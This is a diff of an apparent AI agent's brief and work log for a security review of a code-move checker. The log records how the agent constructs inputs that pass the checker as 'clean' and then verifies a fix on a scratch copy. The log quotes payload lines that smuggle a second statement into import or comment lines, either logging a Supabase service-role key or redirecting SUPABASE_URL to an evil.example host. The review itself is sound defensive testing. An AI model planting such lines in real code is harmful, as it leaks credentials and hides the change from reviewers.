@@ -6,8 +6,8 @@ model: opus
 parent: "[[Spud]]"
 ticket: "[[BAD-078]]"
 project: badtakes
-status: planned
-spawned: ""
+status: active
+spawned: 2026-09-16T00:12
 finished: ""
 tags: [spudagent]
 ---
@@ -57,8 +57,15 @@ Your Result gives the verdict, every finding tied to a file and line with the co
 No `git commit`, `add`, `push`, `checkout`, `switch`, `rebase`, `stash` or any other git write; read-only git (`show`, `log`, `diff`, `cat-file`, `archive`) is your instrument. No tickets — file a proposal. Never edit anything under `ledger/` or `reports/`. Never deploy from this machine. Timestamps are the CLI's, never typed. No child of yours runs on fable — Fable's weekly limit is reached (Eric, 2026-09-15); pass an explicit `--model opus` or lower, and `--model haiku` for any `claude -p` probe.
 
 ## Log
+- 2026-09-16T00:13 Read brief, Russet's full Result and Carola's Result. Starting with the code: account.mjs (F1 header rule + HEADERS), lines.mjs (F3 wiring rule), waivers.mjs (two cosmetics), then --help.
+- 2026-09-16T00:18 FALSE CLEAN CONSTRUCTED (L1). One added line in the new tree: "import './sweep.ts'; console.log('SERVICE KEY', Deno.env.get('SUPABASE_SERVICE_ROLE_KEY'));" at index.ts:13. lines.mjs:124 accepts it via BARE_IMPORT, so the whole line is category 'import' on the new side. Exit 0, 'RESULT: clean' byte-identical. Entire report delta: 1491->1492 lines, import 81->82, line-number shifts. Russet's 'a false CLEAN cannot exist' is disproven — though his argument was about the matcher, and the matcher is not what forgave it.
+- 2026-09-16T00:25 L1 (silent, byte-identical): change an EXISTING new-side import line to carry a second statement. index.ts:2 -> "import { fail, preflight } from '../_shared/respond.mjs'; Deno.env.set('SUPABASE_URL', 'https://evil.example');". Exit 0, RESULT clean, and md5 of the report equals the clean baseline's (760f0842cdd332cfeb06a9235878c211 both). Same signature as Russet's F1 — a behaviour change with ZERO trace in the report. Root: lines.mjs:120-125 accepts a module statement on SPECIFIER/BARE_IMPORT alone and exempts the whole LINE; nothing requires the statement to end at the specifier. 12 old lines + 81 new lines are import-accounted on the clean BAD-047 run.
+- 2026-09-16T00:27 Five false CLEANs total, all exit 0, all valid executing ES modules (verified by importing the payload shapes). L1 import-line (silent/byte-identical, and an added-line variant), L2 banner via a line starting /* (one added line, delta = banner 62->63), L3 header tail admits comma-sequence/ternary/arrow (signalled in HEADERS, not gated), L4 REQUIRE_BINDING namelist admits a default expression. F1 and F3 regressions both confirmed exit 1. All six corpus runs still clean, so the F3 tightening caused no false alarm. Also: --json (movecheck.mjs:200-209) omits headers AND isolated, so both signals the design leans on exist only in the human report.
+- 2026-09-16T00:30 SECOND byte-identical false CLEAN (L2): rewrite one EXISTING new-prose banner line, room.ts:7, from '// updated row.' to '/* updated row. */ console.log(...Deno.env.get(SUPABASE_SERVICE_ROLE_KEY));'. Exit 0, report md5 760f0842... = clean baseline. Root: isComment (lines.mjs:40-41) is a prefix test — startsWith('//' | '/*' | '*') — and never asks what follows once the comment closes. Two silent holes now, both in the largest forgiving categories (81 import + 62 banner new-side lines on the clean BAD-047 run).
+- 2026-09-16T00:31 Verified a fix rather than only naming one. Patched a COPY of the harness in scratch (repo untouched): end-anchor the two ESM acceptance tests (SPECIFIER_END/BARE_IMPORT_END, mirroring REQUIRE_BINDING's own ;?$), make isComment reject a line with code after the comment closes, and restrict REQUIRE_BINDING's destructuring namelist to identifiers/commas/renames. Result: all six landed splits STILL clean at exit 0 (no false alarm), and all seven of my attacks now exit 1. Caveat to flag: the anchored ESM form would reject an import attribute clause (assert/with { type: 'json' }); nothing in the corpus has one.
 
 ## Sub-agents
+- [[BADS-078/Burbank|Burbank]] (02.01, reviewer, opus)
 
 ## Ticket proposals
 
